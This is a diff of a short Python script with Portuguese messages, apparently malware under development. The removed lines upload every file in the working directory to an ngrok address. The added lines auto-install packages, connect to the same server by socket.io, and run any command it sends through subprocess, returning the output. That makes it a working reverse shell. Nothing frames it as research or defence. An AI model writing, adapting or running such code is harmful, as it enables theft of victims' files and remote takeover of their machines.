@@ -1,24 +1,52 @@
 import os
-import requests
+import subprocess
+import sys
 
-SERVER_URL = "https://unreclining-melinda-intercarpellary.ngrok-free.dev"
+def instalar(pkg):
 
-PASTA = "."
+    try:
+        __import__(pkg)
 
-for nome_arquivo in os.listdir(PASTA):
+    except ImportError:
 
-    caminho = os.path.join(PASTA, nome_arquivo)
+        print("Instalando", pkg)
 
-    if os.path.isfile(caminho):
+        subprocess.check_call(
+            [sys.executable, "-m", "pip", "install", pkg]
+        )
 
-        try:
-            with open(caminho, "rb") as f:
+# instalar dependências automaticamente
+instalar("socketio")
+instalar("requests")
 
-                files = {"file": (nome_arquivo, f)}
+import socketio
 
-                r = requests.post(SERVER_URL, files=files)
+SERVER = "https://unreclining-melinda-intercarpellary.ngrok-free.dev"
 
-                print("Enviado:", nome_arquivo, "| Resposta:", r.text)
+sio = socketio.Client()
 
-        except Exception as e:
-            print("Erro ao enviar", nome_arquivo, e)
+@sio.event
+def connect():
+
+    print("Conectado ao servidor")
+
+
+@sio.on("cmd")
+def executar(cmd):
+
+    print("Executando:", cmd)
+
+    result = subprocess.getoutput(cmd)
+
+    sio.emit("log", result)
+
+
+try:
+
+    sio.connect(SERVER)
+
+    sio.wait()
+
+except Exception as e:
+
+    print("Erro:", e)
